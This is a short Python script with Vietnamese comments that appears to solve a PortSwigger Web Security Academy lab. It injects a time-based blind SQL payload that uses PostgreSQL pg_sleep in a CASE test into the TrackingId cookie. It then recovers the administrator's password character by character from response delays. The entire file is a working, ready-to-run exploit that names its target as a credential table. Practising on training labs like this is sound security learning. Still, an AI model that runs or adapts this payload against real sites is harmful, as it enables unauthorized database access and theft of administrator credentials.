import requests
import time

# URL mục tiêu
url = "https://0a95000d044d2fe083a6066900e2006a.web-security-academy.net/"

# Cookie ban đầu
cookies = {
    "TrackingId": "iOTzRvlSVBbiEFQ2",
    "session": "lVBm2e8jqNrM1dzPg9LqAkU9ARZKWW8d"
}

# Hàm kiểm tra ký tự trong mật khẩu
def is_password_char_correct(position, char):
    # Payload SQL
    payload = f"' || (SELECT CASE WHEN (username='administrator' AND substring(password,{position},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users) --"
    
    # Cập nhật cookie với payload
    cookies["TrackingId"] = "iOTzRvlSVBbiEFQ2" + payload
    
    # Gửi yêu cầu HTTP
    start_time = time.time()
    response = requests.get(url, cookies=cookies)
    end_time = time.time()

    timefin = end_time - start_time
    print(f"[*] Thời gian phản hồi: {timefin}s")
    
    # Kiểm tra thời gian phản hồi
    return timefin > 5  # Thời gian > 5 giây nghĩa là đúng

# Hàm để tìm mật khẩu
def find_password(max_length=20):
    password = ""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    print("[*] Bắt đầu tìm mật khẩu...")
    for position in range(1, max_length + 1):
        found = False
        for char in charset:
            print(f"[*] Thử ký tự '{char}' tại vị trí {position}...")
            if is_password_char_correct(position, char):
                password += char
                print(f"[+] Tìm thấy ký tự '{char}' tại vị trí {position}.")
                found = True
                break
        
        if not found:
            print("[!] Không tìm thấy ký tự nào. Kết thúc.")
            break
    
    return password

# Bắt đầu tấn công
if __name__ == "__main__":
    password = find_password()
    print(f"[+] Mật khẩu tìm được: {password}")
